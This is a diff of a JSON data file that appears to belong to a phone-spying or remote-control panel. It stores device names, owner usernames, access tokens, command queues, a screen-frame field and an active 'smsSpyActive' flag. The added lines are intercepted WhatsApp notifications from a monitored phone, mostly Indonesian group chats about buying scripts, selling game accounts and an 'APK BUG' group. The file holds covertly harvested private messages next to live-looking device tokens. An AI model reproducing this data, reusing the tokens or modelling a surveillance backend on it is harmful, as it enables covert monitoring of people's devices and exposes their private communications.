@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776764979263,
+    "lastSeen": 1776764981950,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -4105,7 +4105,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776764978102,
+    "lastSeen": 1776764981118,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -4121,6 +4121,54 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎7Sex Message (136 pesan): ~ Amsal",
+        "content": "🚩 Perintah tidak ditemukan. Apakah maksud Anda? :\n\n1. .lsc (66.7%)\n\n> Balas dengan angka yang akan dieksekusi.. (Berakhir dalam 3 menit)",
+        "time": "21/04 16:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776764981953
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎4189 pesan dari 23 chat",
+        "time": "21/04 16:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776764981630
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎7Sex Message (136 pesan): ~ zal",
+        "content": "Buy Script",
+        "time": "21/04 16:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776764981600
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎7Sex Message (136 pesan): ~ hyurά",
+        "content": "Terjadi kesalahan, silakan coba lagi nanti",
+        "time": "21/04 16:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776764981198
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎4186 pesan dari 23 chat",
+        "time": "21/04 16:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776764981172
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (397 pesan): ~ Agung",
+        "content": "TAWARIN AKUN EP EP 50—1JT ❗❗❗\nTAWARIN AKUN EP EP 50—1JT ❗❗❗\nTAWARIN AKUN EP EP 50—1JT ❗❗❗\nTAWARIN AKUN EP EP 50—1JT❗❗❗\nTAWARIN AKUN EP EP 50—1JT ❗❗❗",
+        "time": "21/04 16:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776764980793
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎GB JB APK BUG BY ZIDE × KYY😈 (172 pesan): ~ jokispaceman",
